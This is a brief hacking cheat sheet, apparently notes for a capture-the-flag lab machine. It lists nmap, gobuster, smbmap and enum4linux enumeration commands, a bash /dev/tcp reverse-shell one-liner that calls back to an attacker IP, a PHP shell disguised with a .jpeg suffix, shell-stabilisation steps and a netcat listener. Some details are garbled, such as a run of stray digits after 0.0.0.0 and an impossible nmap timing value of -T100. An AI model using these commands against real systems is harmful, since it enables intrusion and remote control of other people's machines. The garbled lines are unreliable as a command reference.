# We are going to do basic of Hacking

ip = 10.10.207.48

youtube: <https://www.youtube.com/watch?v=B9wue1PrdeM>(View Walkthrough)

## Directory Hosting

python -m http.server 4444 --bind 0.0.0.0111111111111111111111111111111111

## Enumeration

1. nmap -sC -sV -T100 10.10.207.48
2. nmap -sT <'ip address>
3. nmap -sP <'ip address>

===============================================

1. gobuster dir -u 10.10.207.48 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
2. smbmap -H 10.10.207.48
3. enum4linux -a 10.10.207.48


## reverse shell

1. bash -c "bash -i >& /dev/tcp/10.10.14.161/443 0>&1"
2. Adding Rev Shell from Dir

[<http://10.6.39.83/shell.php#.jpeg>](http://10.6.39.83:8888/shell.php#.jpeg)

pty enable
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl Z
stty raw -echo
fg
export TERM=xterm

## Listening on port

1. rlwrap nc -nlvp 4444
